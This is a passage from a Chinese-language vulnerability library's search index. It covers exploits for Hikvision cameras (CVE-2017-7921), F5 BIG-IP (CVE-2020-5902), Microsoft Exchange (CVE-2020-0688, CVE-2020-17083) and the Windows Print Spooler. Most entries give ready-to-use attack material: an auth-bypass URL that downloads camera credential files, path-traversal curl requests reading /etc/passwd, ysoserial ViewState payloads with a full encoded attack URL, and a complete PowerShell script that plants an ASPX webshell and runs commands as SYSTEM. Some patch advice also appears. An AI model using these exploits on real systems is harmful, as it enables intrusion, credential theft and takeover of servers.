160106\u8bbe\u5907\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u5145\u5206\u6216\u6b63\u786e\u5730\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e0d\u6b63\u786e\u7684\u8eab\u4efd\u9a8c\u8bc1\u6f0f\u6d1e\u3002\u8fd9\u53ef\u80fd\u5141\u8bb8\u6076\u610f\u7528\u6237\u5347\u7ea7\u5176\u5728\u7cfb\u7edf\u4e0a\u7684\u6743\u9650\u5e76\u83b7\u5f97\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u8bbf\u95ee\u6743\u9650</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/Hikvision%28CVE-2017-7921%29/#_2","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6076\u610f\u653b\u51fb\u8005\u63d0\u5347\u5176\u6743\u9650\u6216\u5047\u8bbe\u5df2\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u5e76\u83b7\u53d6\u654f\u611f\u6570\u636e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/Hikvision%28CVE-2017-7921%29/#_3","title":"\u5229\u7528\u65b9\u5f0f","text":"<p>1.\u76f4\u63a5\u4e0aCVE-2017-7921\u7684exp</p> <pre><code>http://camera.ip/Security/users?auth=YWRtaW46MTEK\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8d26\u6237\u540d\u662fadmin</p> <p>2\u3001\u5728\u6ca1\u6709\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u6444\u50cf\u5934\u5feb\u7167</p> <p></p> <p>3\u3001\u4e0b\u8f7d\u6444\u50cf\u5934\u914d\u7f6e\u8d26\u53f7\u5bc6\u7801\u6587\u4ef6 http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/Hikvision%28CVE-2017-7921%29/#_4","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u6d77\u5eb7\u5a01\u89c6\u5df2\u53d1\u5e03\u66f4\u65b0\uff0c\u4ee5\u51cf\u8f7b\u901a\u8fc7\u6388\u6743\u5206\u9500\u5546\u9500\u552e\u7684\u6444\u50cf\u5934\u4e2d\u7684\u4e0d\u6b63\u786e\u8eab\u4efd\u9a8c\u8bc1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u66f4\u65b0\u53ef\u4ece\u4ee5\u4e0b\u4f4d\u7f6e\u4e0b\u8f7d\uff1ahttp://www.hikvision.com/us/about_.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/","title":"\u6f0f\u6d1e\u7f16\u53f7","text":"<p>CVE-2020-5902</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>BIG-IP 15.x: 15.1.0/15.0.0 BIG-IP 14.x: 14.1.0 ~ 14.1.2 BIG-IP 13.x: 13.1.0 ~ 13.1.3 BIG-IP 12.x: 12.1.0 ~ 12.1.5 BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_3","title":"\u901a\u7528\u4fee\u8865\u5efa\u8bae","text":"<p>\u5347\u7ea7\u5230\u4ee5\u4e0b\u7248\u672c BIG-IP 15.x: 15.1.0.4 BIG-IP 14.x: 14.1.2.6 BIG-IP 13.x: 13.1.3.4 BIG-IP 12.x: 12.1.5.2 BIG-IP 11.x: 11.6.5.2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_4","title":"\u4e34\u65f6\u4fee\u8865\u5efa\u8bae","text":"<p>\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u767b\u5f55\u5bf9\u5e94\u7cfb\u7edf tmsh</p> <p>\u7f16\u8f91 httpd \u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6 edit /sys httpd all-properties \u6587\u4ef6\u5185\u5bb9\u5982\u4e0b include '  Redirect 404 /  ' \u6309\u7167\u5982\u4e0b\u64cd\u4f5c\u4fdd\u5b58\u6587\u4ef6 \u6309\u4e0b ESC \u5e76\u4f9d\u6b21\u8f93\u5165 :wq \u6267\u884c\u547d\u4ee4\u5237\u65b0\u914d\u7f6e\u6587\u4ef6 save /sys config \u91cd\u542f httpd \u670d\u52a1 restart sys service httpd \u5e76\u7981\u6b62\u5916\u90e8IP\u5bf9 TMUI \u9875\u9762\u7684\u8bbf\u95ee</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_5","title":"\u6587\u4ef6\u8bfb\u53d6","text":"<p>curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/F5/CVE-2020-5902/#_6","title":"\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":"<p>curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-0688</p> <p>\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u653b\u51fb\u8005\u5411\u5b58\u5728\u7f3a\u9677\u7684Exchange\u670d\u52a1\u5668\u53d1\u9001\u7ecf\u8fc7\u7279\u6b8a\u5904\u7406\u7684\u7535\u5b50\u90ae\u4ef6\u5373\u53ef\u89e6\u53d1\u6f0f\u6d1e\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u7531\u4e8eExchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u6ca1\u6709\u6b63\u786e\u5730\u521b\u5efa\u552f\u4e00\u7684\u52a0\u5bc6\u5bc6\u94a5\u6240\u9020\u6210\u7684\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0c\u4e0e\u6bcf\u6b21\u8f6f\u4ef6\u5b89\u88c5\u90fd\u4f1a\u4ea7\u751f\u968f\u673a\u5bc6\u94a5\u4e0d\u540c\uff0c\u6240\u6709Exchange Server\u5728\u5b89\u88c5\u540e\u7684web.config\u6587\u4ef6\u4e2d\u90fd\u62e5\u6709**\u76f8\u540c\u7684validationKey\u548cdecryptionKey**\u3002\u8fd9\u4e9b\u5bc6\u94a5\u7528\u4e8e\u4fdd\u8bc1ViewState\u7684\u5b89\u5168\u6027\u3002\u800cViewState\u662fASP.NET Web\u5e94\u7528\u4ee5\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u5728\u5ba2\u6237\u673a\u4e0a\u7684\u670d\u52a1\u7aef\u6570\u636e\u3002\u5ba2\u6237\u7aef\u901a\u8fc7__VIEWSTATE\u8bf7\u6c42\u53c2\u6570\u5c06\u8fd9\u4e9b\u6570\u636e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002</p> <p>\u5f71\u54cd\u7248\u672c\uff1aexchange 2010\u30012013\u30012016\u30012019\u5168\u7248\u672c\u901a\u6740\u3002</p> <p>\u6f0f\u6d1e\u590d\u73b0\uff1a</p> <p>\u590d\u73b0\u73af\u5883\uff1aserver 12 + exchange 2013 15.0.516.32\uff082012 \u5e7412\u67083\u65e5\uff09\u548c15.0.1497.2\uff082019\u5e746\u670818\u65e5\uff09\u4e24\u7248\u3002</p> <p>\u590d\u73b0\u8fc7\u7a0b\uff1a</p> <p>1\u3001\u83b7\u53d6ViewStateUserKey\u503c</p> <p>/ecp/default.aspx</p> <p>F12\u952e\u6253\u5f00\u5f00\u53d1\u5de5\u5177\u7684Network\u9009\u9879\uff0c\u7136\u540e\u6309F5\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u3002\u6211\u4eec\u9700\u8981\u627e\u5230\u767b\u5f55\u65f6<code>/ecp/default.aspx</code>\u7684\u539f\u59cb\u54cd\u5e94\uff1a</p> <p></p> <p>2\u3001\u83b7\u53d6\u53d6__VIEWSTATEGENERATOR\u503c\uff1a</p> <p>\u540c\u6837\u5728/ecp/default.aspx\u7684\u54cd\u5e94\u5305\u5185\uff0c\u76f4\u63a5\u641c\u7d22\u5173\u952e\u8bcd\u5373\u53ef\u3002</p> <p></p> <p>\u6216\u4f7f\u7528document.getElementById(\"__VIEWSTATEGENERATOR\").value</p> <p></p> <p>\u5982\u679c\u53d1\u73b0\u6ca1\u6709\u6539\u5b57\u6bb5\uff0c\u662f\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u5b89\u88c5KB2919355\u8865\u4e01\uff0c\u66f4\u65b0\u8be5\u8865\u4e01\u540e\u53ef\u663e\u793a\uff0c\u4f46\u662f\u8be5\u5b57\u6bb5\u503c\u57fa\u672c\u552f\u4e00\uff0c\u4e0d\u9700\u8981\u523b\u610f\u83b7\u5f97\u3002</p> <p>3.\u6574\u7406\u5df2\u77e5\u53c2\u6570</p> <p>--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09**</p> <p>--validationalg = SHA1**\uff08\u9ed8\u8ba4\uff0c\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff09**</p> <p>--generator = B97B4E27**\uff08\u57fa\u672c\u9ed8\u8ba4\uff09**</p> <p>--viewstateuserkey = d673d1a4-1794-403e-ab96-e283ca880ef2**\uff08\u624b\u5de5\u83b7\u53d6\uff0c\u53d8\u91cf\uff0c\u6bcf\u6b21\u767b\u9646\u90fd\u4e0d\u4e00\u81f4\uff09**</p> <p>4.\u751f\u6210payload:</p> <p>.\\ysoserial.exe -p ViewState -g  TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\"  --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\"  --generator=\"B97B4E27\"  --viewstateuserkey=\"d673d1a4-1794-403e-ab96-e283ca880ef2\" --isdebug  --islegacy</p> <p></p> <p>5.\u4e0a\u9762ysoserial.exe\u751f\u6210\u7684payload\u8981\u7528URL Encode\u7f16\u7801\uff1a</p> <p></p> <p>6.\u5b8c\u6574\u7684\u653b\u51fb\u5730\u5740\u793a\u4f8b\uff1a</p> <p>https://192.168.1.248/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4Lp73ado0NJN2PSSnfOoN9h4H7xCU%3D</p> <p>7.\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a</p> <p></p> <p>//ysoserial.exe\u4e0b\u8f7d\uff1a</p> <p>https://github.com/pwntester/ysoserial.net</p> <p>https://github.com/Jumbo-WJB/CVE-2020-0688 https://github.com/random-robbie/cve-2020-0688</p> <p>//Exchange\u7248\u672c\u548c\u5404\u66f4\u65b0\u5305\u4e0b\u8f7d\uff1a</p> <p>https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2016</p> <p>8.\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6</p> <p>\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6\u8fd9\u4e00\u70b9\u5176\u5b9e\u6700\u5751\u4e86\uff0c\u660e\u660e\u53ef\u4ee5\u542f\u52a8calc.exe\u4f46\u662f\u5c31\u662f\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\uff0c\u5bfc\u81f4\u6211\u6700\u521d\u4e00\u76f4\u4ee5\u4e3a\u662f\u7248\u672c\u95ee\u9898\u6216\u8005__VIEWSTATEGENERATOR\u53c2\u6570\u95ee\u9898\u3002\u4f46\u662f\u540e\u6765\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u867d\u7136\u5728\u6f14\u793a\u8fc7\u7a0b\u4e2d\u76f4\u63a5-c \"echo OOOPS!!! &gt;  c:/Vuln_Server.txt\"\u521b\u5efa\u6587\u4ef6\uff0c\u8ba9\u4eba\u8bef\u4ee5\u4e3a-c\u662f\u5728cmd\u7a97\u53e3\u4e0b\u8fd0\u884c\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a-c\u5b9e\u9645\u4e3a\u201c\u8fd0\u884c\u201d\u7684\u5185\u5bb9\uff0c\u56e0\u6b64\u76f4\u63a5echo\u662f\u4e0d\u884c\u7684\uff0c\u9700\u8981-c \"cmd /c echo test &gt; C:\\1.txt\"\u8fd9\u6837\u521b\u5efa\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/","title":"CVE 2020 17083 Microsoft Exchange Server\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#cve-2020-17083-microsoft-exchange-server-poc","title":"CVE-2020-17083 Microsoft Exchange Server\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_1","title":"\u7b80\u4ecb","text":"<p>CVE-2020-17083\u662f\u5b58\u5728\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u4e2d\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002</p> <p>CVE-2020-17083 CVSS:3.0 5.5/4.8CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L/E:U/RL:O/RC:C</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_2","title":"\u5229\u7528\u65b9\u5f0f","text":"<p>\u6ce8\u610f\uff0c\u9700\u8981Exchange Server Certificates\u89d2\u8272\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u7528\u6237  harryh\uff0c\u67e5\u770bexchange\u670d\u52a1\u5668\u4e2d\u5173\u4e8eharryh\u7528\u6237\u7684\u4fe1\u606f</p> <pre><code>[PS] C:\\Windows\\system32&gt;New-RoleGroup -Name \"cert users\" -Roles \"Exchange Server Certificates\" -Members \"harryh\"\n\nName       AssignedRoles                  RoleAssignments                           ManagedBy\n----       -------------                  ---------------                           ---------\ncert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin}\n\n\n[PS] C:\\Windows\\system32&gt;Get-RoleGroup \"cert users\" | Format-List\n\nRunspaceId                  : a97d7e2c-d036-4bfc-b95c-4fabcb644160\nManagedBy                   : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin}\nRoleAssignments             : {Exchange Server Certificates-cert users}\nRoles                       : {Exchange Server Certificates}\nDisplayName                 :\nExternalDirectoryObjectId   :\nMembers                     : {exchangedemo.com/Users/Harry Houdini}\nSamAccountName              : cert users\nDescription                 :\nRoleGroupType               : Standard\nLinkedGroup                 :\nCapabilities                : {}\nLinkedPartnerGroupId        :\nLinkedPartnerOrganizationId :\nIdentity                    : exchangedemo.com/Microsoft Exchange Security Groups/cert users\nIsValid                     : True\nExchangeVersion             : 0.10 (14.0.100.0)\nName                        : cert users\nDistinguishedName           : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com\nGuid                        : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f\nObjectCategory              : exchangedemo.com/Configuration/Schema/Group\nObjectClass                 : {top, group}\nWhenChanged                 : 6/12/2020 4:15:54 AM\nWhenCreated                 : 6/12/2020 1:34:51 AM\nWhenChangedUTC              : 6/11/2020 8:15:54 PM\nWhenCreatedUTC              : 6/11/2020 5:34:51 PM\nOrganizationId              :\nId                          : exchangedemo.com/Microsoft Exchange Security Groups/cert users\nOriginatingServer           : DEAD01.exchangedemo.com\nObjectState                 : Changed\n</code></pre> <p>\u8fd0\u884c\u5982\u4e0b\u7684\u547d\u4ee4\u6267\u884c\u653b\u51fb</p> <pre><code>PS C:\\Users\\researcher&gt; .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123##-cmd mspaint\n(+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123###\n(+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta\n(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx\n(+) shell written, executing command...\n(+) executed mspaint as SYSTEM!\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#poc","title":"POC","text":"<pre><code>param (\n    [Parameter(Mandatory=$true)][string]$server,\n    [Parameter(Mandatory=$true)][string]$usr,\n    [Parameter(Mandatory=$true)][string]$pwd,\n    [string]$cmd = \"mspaint\"\n)\n\nFunction Get-RandomAlphanumericString {\n    [CmdletBinding()]\n    Param (\n        [int] $length = 8\n    )\n    Process{\n        Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}) )\n    }    \n}\n\nfunction Writebad-File{\n    Param (\n        [string] $fn,\n        [string] $content,\n        [System.Management.Automation.Runspaces.PSSession] $session\n    )\n    $selector = Get-RandomAlphanumericString\n    Invoke-Command -Session $session -ScriptBlock {\n        New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName \"c=$Using:selector,o=$Using:content,cn=si\"\n    } | Out-Null\n    $thumb = Invoke-Command -Session $session -ScriptBlock {\n         Get-ExchangeCertificate \n    } | Where-Object -Property Subject -like \"*c=$selector*\" | select-object -Expand Thumbprint\n\n    # this is where the file write is for this bug\n    Invoke-Command -Session $session -ScriptBlock {\n         Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded;\n    } | Out-Null\n}\nfunction Exploit-Exchange {\n    Param (\n        [string] $server,\n        [string] $usr,\n        [string] $pwd,\n        [string] $cmd\n    )\n    \"(+) targeting $server with ${usr}:$pwd\"\n    $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force\n    $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd)\n    $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds\n    $hta = Get-RandomAlphanumericString\n    $aspx = Get-RandomAlphanumericString\n\n    # write a hta file with commands\n    Writebad-File -fn \"C:/Windows/Temp/$hta.hta\" -content \"&lt;script&gt;new ActiveXObject('WScript.Shell').Exec('cmd /c $cmd')&lt;/script&gt;\" -session $s\n    \"(+) wrote to target file C:/Windows/Temp/$hta.hta\" \n\n    # write aspx file\n    Writebad-File -fn \"C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" -content \"&lt;%=System.Diagnostics.Process.Start(Request[Request.HttpMethod])%&gt;\" -session $s\n    \"(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" \n    \"(+) shell written, executing command...\"\n    $b = @{\n        destination = \"https://$server/ecp/$aspx.aspx?GET=C:/Windows/Temp/$hta.hta\"\n        flags = ''\n        username = $usr\n        password = $pwd\n    }\n    $r = Invoke-WebRequest \"https://$server/owa/auth.owa\" -SessionVariable 'websess' -Body $b -Method 'POST' | Select-Object -Expand Forms\n    if ([string]::IsNullOrWhiteSpace($r)) {\n        \"(+) executed $cmd as SYSTEM!\"\n    } else {\n        \"(-) exploit failed\"\n    }    \n}\n\nGet-PSSession | Remove-PSSession\nExploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_3","title":"\u53c2\u8003","text":"<p>https://srcincite.io/pocs/cve-2020-17083.ps1.txt</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/","title":"CVE-2020-1048 Microsoft Windows Print Spooler\u63d0\u6743\u6f0f\u6d1e","text":"<p>\u4eca\u5e745\u6708\uff0c\u5fae\u8f6f\u53d1\u5e03\u5b89\u5168\u8865\u4e01\u4ee5\u4fee\u8865Windows \u6253\u5370\u673a\u540e\u53f0\u5904\u7406\u7a0b\u5e8f\u9ad8\u5371\u672c\u5730\u63d0\u6743\u5347\u7ea7\u6f0f\u6d1e\uff0c\u7f16\u53f7CVE-2020-1048\u3002\u5b83\u53ef\u4ee5\u83b7\u53d6\u7cfb\u7edf\u7ba1\u7406\u5458\u6743\u9650\uff0c\u751a\u81f3\u90e8\u7f72\u6301\u4e45\u5316\u540e\u95e8\uff0c\u5f71\u54cd\u8303\u56f4\u81ea1996\u5e74\u4ee5\u6765\u53d1\u5e03(Windows NT 4)\u7684\u6240\u6709Windows\u7248\u672c\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6838\u5fc3\u539f\u7406\u5728\u4e8ewindows\u6dfb\u52a0\u6253\u5370\u673a\u65f6\uff0c\u5bf9port name\u7684\u68c0\u67e5\u51fd\u6570\u53ef\u4ee5\u88ab\u7ed5\u8fc7\uff0c\u8bbe\u7f6e\u4e3a\u4efb\u610f\u6587\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u628a\u4efb\u610f\u5185\u5bb9\u8f93\u51fa\u5230port name\u5bf9\u5e94\u7684\u7cfb\u7edf\u6587\u4ef6(\u5982\u67d0\u4e2adll)\u4e2d\uff0c\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u3002\u7ecf\u8fc7\u8865\u4e01\u540e\uff0c\u7d27\u968f\u5176\u540e\u7684CVE-2020-1337\u53c8\u6709\u59ff\u52bf\u53ef\u4ee5\u7ed5\u68c0\u67e5\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Microsoft Windows 10 Windows 10 1607\u7248\u672c Windows 10 1709\u7248\u672c Windows 10 1803\u7248\u672c Windows 10 1809\u7248\u672c Windows 10 1903\u7248\u672c Windows 10 1909\u7248\u672c Windows 7 SP1 Windows 8.1 Windows RT 8.1 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 Windows Server 2019 Windows Server 1803\u7248\u672c Windows Server 1903\u7248\u672c Windows Server 1909\u7248\u672c \u4fee\u590d\u5efa\u8bae \u5173\u6ce8\u5b98\u65b9\u53d1\u5e03\u7684\u8865\u4e01\u5347\u7ea7\u53ca\u65f6\u4fee\u590d\u6f0f\u6d1e\u3002 https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1048 POC 